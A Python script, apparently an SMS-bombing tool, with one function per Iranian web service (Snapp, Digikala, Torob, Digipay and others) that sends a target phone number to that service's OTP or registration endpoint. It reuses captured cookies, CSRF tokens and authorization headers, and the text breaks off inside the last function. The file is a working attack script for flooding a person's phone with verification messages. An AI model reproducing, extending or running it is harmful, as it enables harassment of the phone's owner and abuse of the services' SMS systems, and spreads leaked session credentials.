import requests

def snapp(phone):

    cookies = {
    '_ym_uid': '1695376566137215772',
    '_ym_d': '1695376566',
    '_ym_isad': '2',
    'e84e63b89edcd3e81f8d7a83bf7f93e2': '95d209204dd7601a77af23837cf9f594',
    '3a565cf0931043ace2503de000792fb4': '417f8a70e6c494522f143fc23afdf4d0',
}

    headers = {
    'authority': 'app.snapp.taxi',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'app-version': 'pwa',
    'content-type': 'application/json',
    # 'cookie': '_ym_uid=1695376566137215772; _ym_d=1695376566; _ym_isad=2; e84e63b89edcd3e81f8d7a83bf7f93e2=95d209204dd7601a77af23837cf9f594; 3a565cf0931043ace2503de000792fb4=417f8a70e6c494522f143fc23afdf4d0',
    'locale': 'fa-IR',
    'origin': 'https://app.snapp.taxi',
    'referer': 'https://app.snapp.taxi/login/?redirect_to=%2F%3Futm_source%3Dwebsite%2Cutm_medium%3Dwebapp-button%2Cutm_campaign%3Dbody',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'x-app-name': 'passenger-pwa',
    'x-app-version': '17.4.0',
}
    json_data = {
    'cellphone': '0'+phone,
}

    response = requests.post('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', cookies=cookies, headers=headers, json=json_data)
 
    return response
def digikala(phone):
    cookies = {
    '_ga': 'GA1.1.860839956.1695366549',
    'tracker_glob_new': 'ghOZkjW',
    'tracker_session': 'bZrteYW',
    '_sp_ses.13cb': '*',
    '_hp2_ses_props.1726062826': '%7B%22r%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22ts%22%3A1695366552374%2C%22d%22%3A%22www.digikala.com%22%2C%22h%22%3A%22%2F%22%7D',
    '_hp2_id.1726062826': '%7B%22userId%22%3A%222915783771421105%22%2C%22pageviewId%22%3A%225047915486696042%22%2C%22sessionId%22%3A%224876362131603970%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D',
    '_sp_id.13cb': 'ba5f3f8a-648e-4bae-a8cf-fc59d7cf9087.1695366551.1.1695366557..7242ab83-315d-40bd-b7c1-f4a80c1c794d..d79611b6-7a01-44d8-8238-cb12e16ff2c4.1695366551377.6',
    'ab_test_experiments': '%5B%5D',
    'TS01c77ebf': '0102310591c175c39c10ba1fdd68ec73d4c528fb020ea1b208809b301dbeff2daca40bfb8dd04dfe251afd9f67710ba815c6fc6c9c3c31fb1c94e67ce3205920ddee6d6b02ed961570489410a1fcbee1201f93024dc96acf774dd9e1d20da7b28e0021131a',
    '_ga_50CEWK5GC9': 'GS1.1.1695366548.1.1.1695366591.0.0.0',
}

    headers = {
    'authority': 'api.digikala.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/json',
    # 'cookie': '_ga=GA1.1.860839956.1695366549; tracker_glob_new=ghOZkjW; tracker_session=bZrteYW; _sp_ses.13cb=*; _hp2_ses_props.1726062826=%7B%22r%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22ts%22%3A1695366552374%2C%22d%22%3A%22www.digikala.com%22%2C%22h%22%3A%22%2F%22%7D; _hp2_id.1726062826=%7B%22userId%22%3A%222915783771421105%22%2C%22pageviewId%22%3A%225047915486696042%22%2C%22sessionId%22%3A%224876362131603970%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D; _sp_id.13cb=ba5f3f8a-648e-4bae-a8cf-fc59d7cf9087.1695366551.1.1695366557..7242ab83-315d-40bd-b7c1-f4a80c1c794d..d79611b6-7a01-44d8-8238-cb12e16ff2c4.1695366551377.6; ab_test_experiments=%5B%5D; TS01c77ebf=0102310591c175c39c10ba1fdd68ec73d4c528fb020ea1b208809b301dbeff2daca40bfb8dd04dfe251afd9f67710ba815c6fc6c9c3c31fb1c94e67ce3205920ddee6d6b02ed961570489410a1fcbee1201f93024dc96acf774dd9e1d20da7b28e0021131a; _ga_50CEWK5GC9=GS1.1.1695366548.1.1.1695366591.0.0.0',
    'origin': 'https://www.digikala.com',
    'referer': 'https://www.digikala.com/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'x-web-client': 'desktop',
    'x-web-optimize-response': '1',
}

    json_data = {
    'backUrl': '/',
    'username': '0'+phone,
    'otp_call': False,
}

    response = requests.post('https://api.digikala.com/v1/user/authenticate/', cookies=cookies, headers=headers, json=json_data)
def kalatik(phone):
    cookies = {
    'KS-FS': '53l2s818rcnb09pi1v2lo04nbm',
    '_csrf-frontend': '1cfb6ae0ba1aa0f0fa799cd9aef23629f14c8d7724473efbaa3a7ea330c107c2a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%2229qU_drkfih682wxD98HlTySAEiMtHxV%22%3B%7D',
    '_ga_HHBY7KW30Z': 'GS1.1.1695366910.1.0.1695366910.60.0.0',
    '_pk_id.1.e7db': '1680c05ad83efd95.1695366910.',
    '_pk_ses.1.e7db': '1',
    '_ga': 'GA1.2.661228377.1695366910',
    '_gid': 'GA1.2.469166550.1695366910',
    '_gat_gtag_UA_114530408_1': '1',
    '_gat_UA-114530408-1': '1',
    'analytics_token': '054d6640-7ff3-a48c-3729-383bbd502234',
    'analytics_session_token': '347efa8f-9854-31ff-960c-38218dabe4dd',
    'yektanet_session_last_activity': '9/22/2023',
    '_yngt_iframe': '1',
    '_yngt': 'f139dd93-94c2-4382-79a8-cb0e4af3e99c',
}

    headers = {
    'authority': 'kalatik.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'KS-FS=53l2s818rcnb09pi1v2lo04nbm; _csrf-frontend=1cfb6ae0ba1aa0f0fa799cd9aef23629f14c8d7724473efbaa3a7ea330c107c2a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%2229qU_drkfih682wxD98HlTySAEiMtHxV%22%3B%7D; _ga_HHBY7KW30Z=GS1.1.1695366910.1.0.1695366910.60.0.0; _pk_id.1.e7db=1680c05ad83efd95.1695366910.; _pk_ses.1.e7db=1; _ga=GA1.2.661228377.1695366910; _gid=GA1.2.469166550.1695366910; _gat_gtag_UA_114530408_1=1; _gat_UA-114530408-1=1; analytics_token=054d6640-7ff3-a48c-3729-383bbd502234; analytics_session_token=347efa8f-9854-31ff-960c-38218dabe4dd; yektanet_session_last_activity=9/22/2023; _yngt_iframe=1; _yngt=f139dd93-94c2-4382-79a8-cb0e4af3e99c',
    'origin': 'https://kalatik.com',
    'referer': 'https://kalatik.com/login',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'x-csrf-token': 'DqQ3pvfjDKUVtM9bEI1NUi67SNVvjZs6-M09gVyf14I8nUbzqId-znPdp20ovzoqaoJwnQPZ4mm5iFTMKNev1A==',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    '_csrf-frontend': 'DqQ3pvfjDKUVtM9bEI1NUi67SNVvjZs6-M09gVyf14I8nUbzqId-znPdp20ovzoqaoJwnQPZ4mm5iFTMKNev1A==',
    'action': 'send_activation_code',
    'username': '0'+phone,
    'type': 'confirm_signup',
}

    response = requests.post('https://kalatik.com/login', cookies=cookies, headers=headers, data=data)
def adak(phone): 

    cookies = {
    '__arcsjs': '29c3fe05ee99fef13bc2d8b8b13b83c5',
    '_ga': 'GA1.1.595507169.1695367197',
    '_gcl_au': '1.1.1871922628.1695367197',
    'analytics_token': '15144522-ed0f-3064-96b2-709e1343c432',
    'analytics_session_token': '919862d7-063a-311f-188b-a023a08aaf0f',
    'yektanet_session_last_activity': '9/22/2023',
    '_yngt_iframe': '1',
    '_yngt': 'f139dd93-94c2-4382-79a8-cb0e4af3e99c',
    '_pin_unauth': 'dWlkPU1tRTRNREk0T0dJdFkyUTRZaTAwWkRGbUxUZ3paRFl0TWpOaU5qYzVZekF6TVRVNA',
    '_ga_8G3L0NPQ13': 'GS1.1.1695367196.1.1.1695367252.4.0.0',
}

    headers = {
    'authority': 'adak.shop',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '__arcsjs=29c3fe05ee99fef13bc2d8b8b13b83c5; _ga=GA1.1.595507169.1695367197; _gcl_au=1.1.1871922628.1695367197; analytics_token=15144522-ed0f-3064-96b2-709e1343c432; analytics_session_token=919862d7-063a-311f-188b-a023a08aaf0f; yektanet_session_last_activity=9/22/2023; _yngt_iframe=1; _yngt=f139dd93-94c2-4382-79a8-cb0e4af3e99c; _pin_unauth=dWlkPU1tRTRNREk0T0dJdFkyUTRZaTAwWkRGbUxUZ3paRFl0TWpOaU5qYzVZekF6TVRVNA; _ga_8G3L0NPQ13=GS1.1.1695367196.1.1.1695367252.4.0.0',
    'origin': 'https://adak.shop',
    'referer': 'https://adak.shop/product-category/laptop-and-accessories/laptop/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    params = {
    'wc-ajax': 'yith_welrp_form_action',
}

    data = {
    'user_login': '0'+phone,
    'origin': '/product-category/laptop-and-accessories/laptop/',
    'additional': '1',
    'context': 'frontend',
}

    response = requests.post('https://adak.shop/', params=params, cookies=cookies, headers=headers, data=data)
def lioncomputer(phone):
    cookies = {
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
    'analytics_token': 'ffc84908-a098-3a3a-e39f-b6ed8abf701a',
    'analytics_session_token': '623b1fb1-a641-0fe1-9368-8b0dd048461e',
    'yektanet_session_last_activity': '9/22/2023',
    '_yngt_iframe': '1',
    '_yngt': 'f139dd93-94c2-4382-79a8-cb0e4af3e99c',
    '_gid': 'GA1.2.483344958.1695369564',
    '_gat_UA-102418714-1': '1',
    'crisp-client%2Fsession%2Ff9b7f903-a664-4fd2-b493-8c88722a4864': 'session_79452c62-5434-4263-abf0-0d2e12057ba9',
    '_hjFirstSeen': '1',
    '_hjIncludedInSessionSample_1118039': '0',
    '_hjSession_1118039': 'eyJpZCI6ImI0Zjk2MmZkLWQyYmMtNDJkZC1hZmQ1LTBhNzE0YmNiMDE4NCIsImNyZWF0ZWQiOjE2OTUzNjk1NjUxOTgsImluU2FtcGxlIjpmYWxzZX0=',
    '_hjAbsoluteSessionInProgress': '1',
    'XSRF-TOKEN': 'eyJpdiI6ImpRdWlaNzlnYk54a2U3N25GSVloTmc9PSIsInZhbHVlIjoieXQyd09OWmYxRS9VWlZaY2RnZzl4c0hKeU90YkpVN21rdzJOM05NaWNsajlqZWlOcEVlcUZhUkw4dzB1RlVwSXk0SFFsVC9laTM3c1R2cXdlT2dwWVFFVGlVUy9JR1FScXRPUzlYVzRmb25NQldkODBVWWorME5OdENjaFhSY0wiLCJtYWMiOiI1ZWQwMGJlMmE3ZmEyNDc4YTRhMTM3ZDZlMmMwN2RkMTUyZDAyZGQ3NDk2ZTM0YWQ0OWE1MjA1MGMxZDEzMTBiIiwidGFnIjoiIn0%3D',
    'avo_session': 'eyJpdiI6Iks5VEUrZm9rNUlueXRhVmZHTkUvK3c9PSIsInZhbHVlIjoiWWs1K2NUODdwek9XZi9XYTR3SlJ1K2xqY0lMdTdxd2JUdHhyNXZuYVY4M0RMMnRXekJYdzhnMEJ5MU9FN2ZlRGhGZDRIRlBCNFNUNXEwK1lMeFBqUDBZbkRaVUJ0TGVTWHg4Um5uRjloQnZNNW9QYlZQUGF1bHhvMUF1bUFCd3oiLCJtYWMiOiIzMWRiMjdmYTJjN2ZlNjlhOWU1OGRjZWQzMTNlZjM2N2MwMWRiZGJiZmMyOTUwMGJlYWVhYmFiYmU1MTVmNThhIiwidGFnIjoiIn0%3D',
    '_hjSessionUser_1118039': 'eyJpZCI6IjIzNjYyMjRhLTNmZWUtNTZiMi1hZTdjLTBmYjcyYjQxZDkyYiIsImNyZWF0ZWQiOjE2OTUzNjk1NjUxOTcsImV4aXN0aW5nIjp0cnVlfQ==',
    '_ga': 'GA1.1.1901604796.1695369563',
    '_ga_R31PBPY1BS': 'GS1.1.1695369563.1.1.1695369587.36.0.0',
}

    headers = {
    'authority': 'www.lioncomputer.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=ffc84908-a098-3a3a-e39f-b6ed8abf701a; analytics_session_token=623b1fb1-a641-0fe1-9368-8b0dd048461e; yektanet_session_last_activity=9/22/2023; _yngt_iframe=1; _yngt=f139dd93-94c2-4382-79a8-cb0e4af3e99c; _gid=GA1.2.483344958.1695369564; _gat_UA-102418714-1=1; crisp-client%2Fsession%2Ff9b7f903-a664-4fd2-b493-8c88722a4864=session_79452c62-5434-4263-abf0-0d2e12057ba9; _hjFirstSeen=1; _hjIncludedInSessionSample_1118039=0; _hjSession_1118039=eyJpZCI6ImI0Zjk2MmZkLWQyYmMtNDJkZC1hZmQ1LTBhNzE0YmNiMDE4NCIsImNyZWF0ZWQiOjE2OTUzNjk1NjUxOTgsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1; XSRF-TOKEN=eyJpdiI6ImpRdWlaNzlnYk54a2U3N25GSVloTmc9PSIsInZhbHVlIjoieXQyd09OWmYxRS9VWlZaY2RnZzl4c0hKeU90YkpVN21rdzJOM05NaWNsajlqZWlOcEVlcUZhUkw4dzB1RlVwSXk0SFFsVC9laTM3c1R2cXdlT2dwWVFFVGlVUy9JR1FScXRPUzlYVzRmb25NQldkODBVWWorME5OdENjaFhSY0wiLCJtYWMiOiI1ZWQwMGJlMmE3ZmEyNDc4YTRhMTM3ZDZlMmMwN2RkMTUyZDAyZGQ3NDk2ZTM0YWQ0OWE1MjA1MGMxZDEzMTBiIiwidGFnIjoiIn0%3D; avo_session=eyJpdiI6Iks5VEUrZm9rNUlueXRhVmZHTkUvK3c9PSIsInZhbHVlIjoiWWs1K2NUODdwek9XZi9XYTR3SlJ1K2xqY0lMdTdxd2JUdHhyNXZuYVY4M0RMMnRXekJYdzhnMEJ5MU9FN2ZlRGhGZDRIRlBCNFNUNXEwK1lMeFBqUDBZbkRaVUJ0TGVTWHg4Um5uRjloQnZNNW9QYlZQUGF1bHhvMUF1bUFCd3oiLCJtYWMiOiIzMWRiMjdmYTJjN2ZlNjlhOWU1OGRjZWQzMTNlZjM2N2MwMWRiZGJiZmMyOTUwMGJlYWVhYmFiYmU1MTVmNThhIiwidGFnIjoiIn0%3D; _hjSessionUser_1118039=eyJpZCI6IjIzNjYyMjRhLTNmZWUtNTZiMi1hZTdjLTBmYjcyYjQxZDkyYiIsImNyZWF0ZWQiOjE2OTUzNjk1NjUxOTcsImV4aXN0aW5nIjp0cnVlfQ==; _ga=GA1.1.1901604796.1695369563; _ga_R31PBPY1BS=GS1.1.1695369563.1.1.1695369587.36.0.0',
    'origin': 'https://www.lioncomputer.com',
    'referer': 'https://www.lioncomputer.com/login?redirect_url=aHR0cHM6Ly93d3cubGlvbmNvbXB1dGVyLmNvbQ==',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'mobile': '0'+phone,
    'redirect_url': 'https://www.lioncomputer.com',
}

    response = requests.post(
    'https://www.lioncomputer.com/api/v1/auth/send-register-code',
    cookies=cookies,
    headers=headers,
    data=data,
)
def torob(phone):
    cookies = {
    '_gcl_au': '1.1.2007503324.1695369791',
    '_ga_CF4KGKM3PG': 'GS1.1.1695369791.1.0.1695369791.0.0.0',
    '_ga': 'GA1.2.1103764200.1695369791',
    '_gid': 'GA1.2.336826834.1695369791',
    '_gat_UA-105982196-1': '1',
    '_clck': 'w15n4e|2|ff8|0|1360',
    '_ym_uid': '1695369792604234262',
    '_ym_d': '1695369792',
    '_ym_isad': '2',
    '_ym_visorc': 'b',
    '_clsk': 'uelzwi|1695369792702|1|0|z.clarity.ms/collect',
}

    headers = {
    'authority': 'api.torob.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    # 'cookie': '_gcl_au=1.1.2007503324.1695369791; _ga_CF4KGKM3PG=GS1.1.1695369791.1.0.1695369791.0.0.0; _ga=GA1.2.1103764200.1695369791; _gid=GA1.2.336826834.1695369791; _gat_UA-105982196-1=1; _clck=w15n4e|2|ff8|0|1360; _ym_uid=1695369792604234262; _ym_d=1695369792; _ym_isad=2; _ym_visorc=b; _clsk=uelzwi|1695369792702|1|0|z.clarity.ms/collect',
    'origin': 'https://torob.com',
    'referer': 'https://torob.com/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
}

    params = {
    'phone_number': '0'+phone,
}

    response = requests.get('https://api.torob.com/v4/user/phone/send-pin/', params=params, cookies=cookies, headers=headers)
def technolife(phone):
    cookies = {
    'user_sid': 's%3Ans5oIukVUMagFYiLIs8bpl1lmRmr8kxj.MEbmT77yeBabn6edBJ2xW9QBVEJELWvu%2F7KOoK9fclI',
    '_gid': 'GA1.2.414009063.1695370445',
    '_gat': '1',
    '_ga': 'GA1.1.653621911.1695370445',
    'analytics_token': '0e818f69-5ff6-74ea-0299-1030384d396d',
    'analytics_session_token': '4d641cbe-74e8-ddf0-6463-3aca3ec4c9c8',
    'yektanet_session_last_activity': '9/22/2023',
    '_yngt_iframe': '1',
    '_yngt': 'f139dd93-94c2-4382-79a8-cb0e4af3e99c',
    '_ga_K74XRXN9ET': 'GS1.1.1695370444.1.1.1695370446.0.0.0',
}

    headers = {
    'authority': 'www.technolife.ir',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.SGhNZkExNlFuTW5GMjhUeENiRzI2SmhIZ0MyN09iTGdFMjk=.AxFqC19PjTdF19IeYpA23IbAyM29IhWaQ33',
    'content-type': 'application/json',
    # 'cookie': 'user_sid=s%3Ans5oIukVUMagFYiLIs8bpl1lmRmr8kxj.MEbmT77yeBabn6edBJ2xW9QBVEJELWvu%2F7KOoK9fclI; _gid=GA1.2.414009063.1695370445; _gat=1; _ga=GA1.1.653621911.1695370445; analytics_token=0e818f69-5ff6-74ea-0299-1030384d396d; analytics_session_token=4d641cbe-74e8-ddf0-6463-3aca3ec4c9c8; yektanet_session_last_activity=9/22/2023; _yngt_iframe=1; _yngt=f139dd93-94c2-4382-79a8-cb0e4af3e99c; _ga_K74XRXN9ET=GS1.1.1695370444.1.1.1695370446.0.0.0',
    'origin': 'https://www.technolife.ir',
    'referer': 'https://www.technolife.ir/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
}

    json_data = {
    'query': 'query check_customer_exists ($username: String, $repeat: Boolean) { check_customer_exists (username: $username, repeat: $repeat) { result request_id } }',
    'variables': {
        'username': '0'+phone,
    },
    'operationName': 'check_customer_exists',
}

    response = requests.post('https://www.technolife.ir/shop_customer', cookies=cookies, headers=headers, json=json_data)
def baslam(phone):
    headers = {
    'authority': 'auth.basalam.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': '',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://basalam.com',
    'referer': 'https://basalam.com/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'x-client-info': '{"name":"web.public","deviceId":"v8f6e2vu7xl"}',
    'x-creation-tags': '{"app":"web","client":"customer","os":"windows","device":"desktop","uri":"/search/list/%25D9%25BE%25D9%2584%25DB%258C-%25D8%25A7%25D8%25B3%25D8%25AA%25DB%258C%25D8%25B4%25D9%2586-5","fullPath":"/search/list/%25D9%25BE%25D9%2584%25DB%258C-%25D8%25A7%25D8%25B3%25D8%25AA%25DB%258C%25D8%25B4%25D9%2586-5","tag":[null]}',
}

    json_data = {
    'mobile': '0'+phone,
    'client_id': 11,
}

    response = requests.post('https://auth.basalam.com/otp-request', headers=headers, json=json_data)
def digipay(phone):
    cookies = {
    'TS01782f99': '01faf121e33b24b70524c020f5f3080f67fb309ccb389a38a9fa40a3f2cc1e0c700cfb539a1028de915d9c67aa043b870211f9a73b',
    '_gcl_au': '1.1.621289367.1695370775',
    '_ga': 'GA1.2.1455954095.1695370775',
    '_gid': 'GA1.2.2079741525.1695370775',
    '_gat_gtag_UA_151948985_1': '1',
    '_gat_UA-151948985-1': '1',
    'analytics_token': '5bd2f1ad-b937-a9b7-5765-39f3b50cbd87',
    'analytics_session_token': '0b14a28b-3fb9-ac14-b2e9-f5ffd3c1cd8b',
    'yektanet_session_last_activity': '9/22/2023',
    '_yngt_iframe': '1',
    '_yngt': 'f139dd93-94c2-4382-79a8-cb0e4af3e99c',
    '_hjSessionUser_3475775': 'eyJpZCI6ImE3MDM0MzRiLWRkYmItNTk2MS1iMWIyLWJjMzBiNzVlNTk2OSIsImNyZWF0ZWQiOjE2OTUzNzA3Nzg4ODUsImV4aXN0aW5nIjpmYWxzZX0=',
    '_hjFirstSeen': '1',
    '_hjIncludedInSessionSample_3475775': '0',
    '_hjSession_3475775': 'eyJpZCI6IjQ1YjQwNGMwLTJiODYtNDAyYS05ZmQ2LTAzNjk3NDIyN2ZkZSIsImNyZWF0ZWQiOjE2OTUzNzA3Nzg4ODksImluU2FtcGxlIjpmYWxzZX0=',
    '_hjAbsoluteSessionInProgress': '0',
    '_ga_10JY0YFPBV': 'GS1.1.1695370775.1.0.1695370786.49.0.0',
}

    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Agent': 'WEBSITE',
    'Authorization': 'Basic d2Vic2l0ZS1jbGllbnQtaWQ6d2Vic2l0ZS1jbGllbnQtc2VjcmV0LTIwMGU2Yzg3LWFiY2QtNDQ0Zi04YTgyLTg4N2FhOTk3NDJhMA==',
    'Client-Version': '1.0.0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    # 'Cookie': 'TS01782f99=01faf121e33b24b70524c020f5f3080f67fb309ccb389a38a9fa40a3f2cc1e0c700cfb539a1028de915d9c67aa043b870211f9a73b; _gcl_au=1.1.621289367.1695370775; _ga=GA1.2.1455954095.1695370775; _gid=GA1.2.2079741525.1695370775; _gat_gtag_UA_151948985_1=1; _gat_UA-151948985-1=1; analytics_token=5bd2f1ad-b937-a9b7-5765-39f3b50cbd87; analytics_session_token=0b14a28b-3fb9-ac14-b2e9-f5ffd3c1cd8b; yektanet_session_last_activity=9/22/2023; _yngt_iframe=1; _yngt=f139dd93-94c2-4382-79a8-cb0e4af3e99c; _hjSessionUser_3475775=eyJpZCI6ImE3MDM0MzRiLWRkYmItNTk2MS1iMWIyLWJjMzBiNzVlNTk2OSIsImNyZWF0ZWQiOjE2OTUzNzA3Nzg4ODUsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_3475775=0; _hjSession_3475775=eyJpZCI6IjQ1YjQwNGMwLTJiODYtNDAyYS05ZmQ2LTAzNjk3NDIyN2ZkZSIsImNyZWF0ZWQiOjE2OTUzNzA3Nzg4ODksImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _ga_10JY0YFPBV=GS1.1.1695370775.1.0.1695370786.49.0.0',
    'Digipay-Version': '2023-01-18',
    'Origin': 'https://www.mydigipay.com',
    'Referer': 'https://www.mydigipay.com/credit/playstation/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    json_data = {
    'cellNumber': '0'+phone,
    'device': {
        'deviceId': 'd520c7a8-421b-4563-b955-f5abc56b97ec',
        'deviceModel': 'Windows/Chrome',
        'deviceAPI': 'WEB_BROWSER',
        'osName': 'WEB',
    },
}

    response = requests.post('https://www.mydigipay.com/digipay/api/users/send-sms', cookies=cookies, headers=headers, json=json_data)
def coffestore(phone):
    cookies = {
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
    'analytics_token': '44983f87-08f6-de29-d992-d55ef945a9cc',
    'analytics_session_token': '3f2b4b72-a2dc-2dbc-9469-541d4fb1030e',
    'yektanet_session_last_activity': '9/22/2023',
    '_yngt_iframe': '1',
    '_yngt': 'f139dd93-94c2-4382-79a8-cb0e4af3e99c',
    'd_user_session': 'd9cef58b69a3d2b09c4c4bfab61d46a5d92ab09972cab95e99ddb62909d892f62f35bf9626de0b698379d5c77ac8cc038ca34e9b2ca37621be82266a1ef2b510',
    'PHPSESSID': '5010130f800c1160b56106620919d560',
}

    headers = {
    'authority': 'coffeestore.ir',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=44983f87-08f6-de29-d992-d55ef945a9cc; analytics_session_token=3f2b4b72-a2dc-2dbc-9469-541d4fb1030e; yektanet_session_last_activity=9/22/2023; _yngt_iframe=1; _yngt=f139dd93-94c2-4382-79a8-cb0e4af3e99c; d_user_session=d9cef58b69a3d2b09c4c4bfab61d46a5d92ab09972cab95e99ddb62909d892f62f35bf9626de0b698379d5c77ac8cc038ca34e9b2ca37621be82266a1ef2b510; PHPSESSID=5010130f800c1160b56106620919d560',
    'origin': 'https://coffeestore.ir',
    'referer': 'https://coffeestore.ir/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'login_digt_countrycode': '+98',
    'digits_phone': phone,
    'action_type': 'phone',
    'sms_otp': '',
    'digits_otp_field': '1',
    'rememberme': '1',
    'digits': '1',
    'instance_id': '40b45cfdf419c21016fcb7db200b7f17',
